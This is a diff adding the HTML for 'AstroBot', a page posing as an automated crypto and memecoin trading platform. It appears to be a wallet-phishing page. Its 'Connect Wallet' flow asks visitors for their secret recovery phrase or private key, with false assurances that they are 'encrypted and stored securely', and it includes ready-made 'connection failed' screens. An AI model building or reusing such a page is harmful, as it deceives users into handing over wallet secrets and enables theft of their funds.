@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AstroBot - Advance Trading Platform</title>
+    <link rel="stylesheet" href="styles.css">
+    <!-- favicon -->
+    <link rel="icon" href="assets/Logo.png" type="image/png">
+    <!-- Add font for hero paragraph -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Welcome Popup -->
+    <div id="welcomePopup" class="welcome-popup">
+        <div class="welcome-content">
+            <div class="welcome-text">
+                <h2>Welcome to AstroBot - The Future of Trading!</h2>
+            </div>
+            <button class="welcome-close" onclick="closeWelcomePopup()">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                    <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round"/>
+                    <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round"/>
+                </svg>
+            </button>
+        </div>
+    </div>
+
+    <!-- Connection Failed Banner -->
+    <div id="connectionFailedBanner" class="connection-failed-banner">
+        <div class="failed-content">
+            <div class="failed-icon">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2" fill="none"/>
+                    <line x1="12" y1="8" x2="12" y2="12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                    <circle cx="12" cy="16" r="1" fill="currentColor"/>
+                </svg>
+            </div>
+            <p>Connection failed. Unable to connect to wallet.</p>
+        </div>
+    </div>
+
+    <!-- Mobile Menu Overlay -->
+    <div id="mobileMenu" class="mobile-menu-overlay">
+        <div class="mobile-menu">
+            <div class="mobile-menu-header">
+                <div class="menu-logo-container">
+                    <div class="menu-logo">
+                        <img src="assets/Logo.png" alt="AstroBot logo" width="48" height="48">
+                    </div>
+                    <h1>AstroBot</h1>
+                </div>
+                <button class="menu-close" onclick="closeMobileMenu()">
+                    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                        <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round"/>
+                        <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round"/>
+                    </svg>
+                </button>
+            </div>
+            <div class="mobile-menu-content">
+                <button class="connect-wallet-btn" onclick="openWalletModal()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/>
+                    </svg>
+                    Connect Wallet
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Wallet Modal -->
+    <div id="walletModal" class="wallet-modal-overlay">
+        <div class="wallet-modal">
+            <!-- Wallet List -->
+            <div id="walletList" class="modal-content">
+                <div class="modal-header">
+                    <div class="modal-title">
+                        <!-- Changed to briefcase icon -->
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M20 8h-3V6c0-1.1-.9-2-2-2H9c-1.1 0-2 .9-2 2v2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6h6v2H9V6zm11 14H4v-3h16v3zm0-5H4v-5h3v1.5c0 .83.67 1.5 1.5 1.5h7c.83 0 1.5-.67 1.5-1.5V10h3v5z"/>
+                        </svg>
+                        <h2>Connect Your Wallet</h2>
+                    </div>
+                    <button class="modal-close" onclick="closeWalletModal()">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round"/>
+                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round"/>
+                        </svg>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <button class="wallet-option hover-lift" onclick="selectWallet('Phantom')">
+                        <div class="wallet-icon">
+                            <img src="assets/Phantom Logo.png" alt="Phantom logo" onerror="this.style.border='2px solid tomato'; this.alt='missing';">
+                        </div>
+                        <span>Phantom</span>
+                        <svg class="arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                        </svg>
+                    </button>
+                    <button class="wallet-option hover-lift" onclick="selectWallet('Solflare')">
+                        <div class="wallet-icon">
+                            <img src="assets/Solfare Logo.png" alt="Solflare logo" />
+                        </div>
+                        <span>Solflare</span>
+                        <svg class="arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                        </svg>
+                    </button>
+                    <button class="wallet-option hover-lift" onclick="selectWallet('Trust Wallet')">
+                        <div class="wallet-icon">
+                            <img src="assets/Trust wallet Logo.png" alt="Trust Wallet logo" />
+                        </div>
+                        <span>Trust Wallet</span>
+                        <svg class="arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                        </svg>
+                    </button>
+                    <button class="wallet-option hover-lift" onclick="selectWallet('WalletConnect')">
+                        <div class="wallet-icon">
+                            <img src="assets/Wallet Connect Logo.png" alt="WalletConnect logo" />
+                        </div>
+                        <span>WalletConnect</span>
+                        <svg class="arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                        </svg>
+                    </button>
+                </div>
+                <div class="modal-footer">
+                    <p>snipe-AstroBot.com</p>
+                </div>
+            </div>
+
+            <!-- Wallet Options -->
+            <div id="walletOptions" class="modal-content" style="display: none;">
+                <div class="modal-header">
+                    <div class="modal-title">
+                        <!-- Changed to checkmark icon -->
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                        </svg>
+                        <h2>Connect Wallet</h2>
+                    </div>
+                    <button class="modal-close" onclick="closeWalletModal()">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round"/>
+                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round"/>
+                        </svg>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <div class="selected-wallet-display">
+                        <div id="selectedWalletIcon" class="wallet-icon">
+                            <img id="selectedWalletIconImg" src="assets/Phantom Logo.png" alt="Selected wallet logo" />
+                        </div>
+                        <span id="selectedWalletName">Phantom</span>
+                    </div>
+                    <button class="import-option hover-lift" onclick="showRecoveryPhrase()">
+                        <div class="import-icon">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/>
+                            </svg>
+                        </div>
+                        <div class="import-text">
+                            <div class="import-title">Import Secret Recovery Phrase</div>
+                            <div class="import-subtitle">Enter your 12 or 24 word recovery phrase</div>
+                        </div>
+                        <svg class="arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                        </svg>
+                    </button>
+                    <button class="import-option hover-lift" onclick="showPrivateKey()">
+                        <div class="import-icon">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                            </svg>
+                        </div>
+                        <div class="import-text">
+                            <div class="import-title">Import Private Key</div>
+                            <div class="import-subtitle">Enter your private key directly</div>
+                        </div>
+                        <svg class="arrow" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Recovery Phrase -->
+            <div id="recoveryPhrase" class="modal-content" style="display: none;">
+                <div class="modal-header">
+                    <div class="modal-title">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                        </svg>
+                        <h2>Connect Wallet</h2>
+                    </div>
+                    <button class="modal-close" onclick="closeWalletModal()">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round"/>
+                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round"/>
+                        </svg>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <div class="selected-wallet-display">
+                        <div id="recoveryWalletIcon" class="wallet-icon">
+                            <img id="recoveryWalletIconImg" src="assets/phantom.png" alt="Recovery wallet logo" />
+                        </div>
+                        <span id="recoveryWalletName">Phantom</span>
+                    </div>
+                    <div class="security-header">
+                        <div class="shield-icon">
+                            <svg width="40" height="40" viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+                            </svg>
+                        </div>
+                        <h3>Enter Recovery Phrase</h3>
+                        <p>Your recovery phrase is encrypted and stored securely</p>
+                    </div>
+                    <div class="input-group">
+                        <label>Recovery Phrase</label>
+                        <div class="input-wrapper">
+                            <input type="password" id="recoveryPhraseInput" placeholder="Enter your 12 or 24 word recovery phrase separated by spaces" class="recovery-input">
+                            <button class="toggle-visibility" onclick="toggleRecoveryVisibility()">
+                                <svg id="recoveryEyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                                    <circle cx="12" cy="12" r="3"/>
+                                </svg>
+                            </button>
+                        </div>
+                        <div class="input-hint">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                                <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2" fill="none"/>
+                                <line x1="12" y1="8" x2="12" y2="12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                                <circle cx="12" cy="16" r="1" fill="currentColor"/>
+                            </svg>
+                            <span>Separate each word with a space (12 or 24 words required)</span>
+                        </div>
+                    </div>
+                    <div class="button-group">
+                        <button class="back-btn hover-lift" onclick="backToOptions()">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 12H5M12 19l-7-7 7-7"/>
+                            </svg>
+                            Back
+                        </button>
+                        <button class="connect-btn hover-lift" onclick="connectWallet()">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10"/>
+                            </svg>
+                            Connect Wallet
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Private Key -->
+            <div id="privateKey" class="modal-content" style="display: none;">
+                <div class="modal-header">
+                    <div class="modal-title">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
+                        </svg>
+                        <h2>Connect Wallet</h2>
+                    </div>
+                    <button class="modal-close" onclick="closeWalletModal()">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round"/>
+                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round"/>
+                        </svg>
+                    </button>
+                </div>
+                <div class="modal-body">
+                    <div class="selected-wallet-display">
+                        <div id="privateKeyWalletIcon" class="wallet-icon">
+                            <img id="privateKeyWalletIconImg" src="assets/phantom.png" alt="Private key wallet logo" />
+                        </div>
+                        <span id="privateKeyWalletName">Phantom</span>
+                    </div>
+                    <div class="security-header">
+                        <div class="shield-icon">
+                            <svg width="40" height="40" viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
+                        </div>
+                        <h3>Enter Private Key</h3>
+                        <p>Your private key is encrypted and stored securely</p>
+                    </div>
+                    <div class="input-group">
+                        <label>Private Key</label>
+                        <div class="input-wrapper">
+                            <input type="password" id="privateKeyInput" placeholder="Enter your private key" class="private-key-input">
+                            <button class="toggle-visibility" onclick="togglePrivateKeyVisibility()">
+                                <svg id="privateKeyEyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                                    <circle cx="12" cy="12" r="3"/>
+                                </svg>
+                            </button>
+                        </div>
+                        <div class="input-hint">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                                <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2" fill="none"/>
+                                <line x1="12" y1="8" x2="12" y2="12" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                                <circle cx="12" cy="16" r="1" fill="currentColor"/>
+                            </svg>
+                            <span>Your private key will be encrypted</span>
+                        </div>
+                    </div>
+                    <div class="button-group">
+                        <button class="back-btn hover-lift" onclick="backToOptions()">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 12H5M12 19l-7-7 7-7"/>
+                            </svg>
+                            Back
+                        </button>
+                        <button class="connect-btn hover-lift" onclick="connectWallet()">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10"/>
+                            </svg>
+                            Connect Wallet
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Connecting -->
+            <div id="connecting" class="modal-content" style="display: none;">
+                <div class="modal-header">
+                    <div class="modal-title">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M1 9l2 2c2.88-2.88 6.94-4.13 10.81-3.21l1.41-1.41C11.26 5.46 6.69 6.49 3.16 9.16L1 7.5V9zm6 6l2 2c1.38-1.38 3.63-1.38 5 0l2-2c-2.5-2.5-6.5-2.5-9 0zm8-4c-3.86 0-7.39 1.56-10 4.07L7 17.5c2.5-2.5 6.5-2.5 9 0L18 15.5c-2.61-2.61-6.14-4.07-10-4.07z"/>
+                        </svg>
+                        <h2>Connection Status</h2>
+                    </div>
+                    <button class="modal-close" onclick="closeWalletModal()">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round"/>
+                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round"/>
+                        </svg>
+                    </button>
+                </div>
+                <div class="modal-body connecting-body">
+                    <div class="connecting-spinner">
+                        <div class="spinner-ring"></div>
+                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/>
+                        </svg>
+                    </div>
+                    <h3>Connecting...</h3>
+                    <p>Please wait while we connect to your wallet</p>
+                </div>
+            </div>
+
+            <!-- Connection Failed -->
+            <div id="connectionFailed" class="modal-content" style="display: none;">
+                <div class="modal-header">
+                    <div class="modal-title">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M1 9l2 2c2.88-2.88 6.94-4.13 10.81-3.21l1.41-1.41C11.26 5.46 6.69 6.49 3.16 9.16L1 7.5V9zm6 6l2 2c1.38-1.38 3.63-1.38 5 0l2-2c-2.5-2.5-6.5-2.5-9 0zm8-4c-3.86 0-7.39 1.56-10 4.07L7 17.5c2.5-2.5 6.5-2.5 9 0L18 15.5c-2.61-2.61-6.14-4.07-10-4.07z"/>
+                        </svg>
+                        <h2>Connection Status</h2>
+                    </div>
+                    <button class="modal-close" onclick="closeWalletModal()">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="2" stroke-linecap="round"/>
+                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="2" stroke-linecap="round"/>
+                        </svg>
+                    </button>
+                </div>
+                <div class="modal-body failed-body">
+                    <div class="failed-icon-large">
+                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <line x1="18" y1="6" x2="6" y2="18" stroke-width="3" stroke-linecap="round"/>
+                            <line x1="6" y1="6" x2="18" y2="18" stroke-width="3" stroke-linecap="round"/>
+                        </svg>
+                    </div>
+                    <h3>Connection Lost</h3>
+                    <p>Error connecting wallet. Please try again.</p>
+                    <button class="retry-btn hover-lift" onclick="retryConnection()">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>
+                        </svg>
+                        Retry
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Decorative Dots -->
+    <div class="decorative-dots">
+        <div class="dot" style="top: 15%; left: 5%;"></div>
+        <div class="dot" style="top: 20%; right: 8%;"></div>
+        <div class="dot" style="top: 45%; left: 3%;"></div>
+        <div class="dot" style="bottom: 35%; right: 10%;"></div>
+        <div class="dot" style="bottom: 15%; left: 8%;"></div>
+        <div class="dot" style="bottom: 25%; right: 5%;"></div>
+    </div>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo-container">
+                <div class="logo">
+                    <img src="assets/Logo.png" alt="AstroBot logo" width="48" height="48">
+                </div>
+                <h1>AstroBot</h1>
+            </div>
+            <button class="menu-btn" onclick="openMobileMenu()">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                    <line x1="3" y1="6" x2="21" y2="6" stroke-width="2" stroke-linecap="round"/>
+                    <line x1="3" y1="12" x2="21" y2="12" stroke-width="2" stroke-linecap="round"/>
+                    <line x1="3" y1="18" x2="21" y2="18" stroke-width="2" stroke-linecap="round"/>
+                </svg>
+            </button>
+        </header>
+
+        <!-- Hero Section -->
+        <section class="hero">
+            <h2 class="slide-in-left">
+                Advanced Trading<br/>
+                with <span class="highlight">AstroBot</span>
+            </h2>
+            <p class="slide-in-right fade-in-delay">
+                Experience the future of automated <span class="accent">CRYPTO</span> and <span class="accent">MEMECOINS</span> trading with our next-gen trading bots. Connect your wallet and ride the momentum of viral <span class="accent">MEMECOINS</span> and top <span class="accent">CRYPTO</span> assets with speed, precision, and confidence all on one powerful, premium platform.
+            </p>
+            <button class="hero-connect-btn hover-lift pulse slide-in-up fade-in-delay-2" onclick="openWalletModal()">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/>
+                </svg>
+                Connect Wallet
+            </button>
+        </section>
+
+        <!-- Trading Stats -->
+        <section class="stats">
+            <div class="stats-card slide-in-up fade-in-delay-2">
+                <div class="stats-header">
+                    <div class="stats-title">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"/>
+                        </svg>
+                        <h3>Live Trading</h3>
+                    </div>
+                    <div class="live-indicator"></div>
+                </div>
+                <div class="stats-body">
+                    <div class="stat-row">
+                        <span class="stat-label">24h Volume</span>
+                        <span class="stat-value" id="volume">$0</span>
+                    </div>
+                    <div class="stat-row">
+                        <span class="stat-label">Active Trades</span>
+                        <span class="stat-value" id="trades">0</span>
+                    </div>
+                    <div class="stat-row">
+                        <span class="stat-label">Success Rate</span>
+                        <span class="stat-value success" id="successRate">0%</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>snipe-AstroBot.com</p>
+        </footer>
+    </main>
+
+    <script src="script.js"></script>
+</body>
+</html>
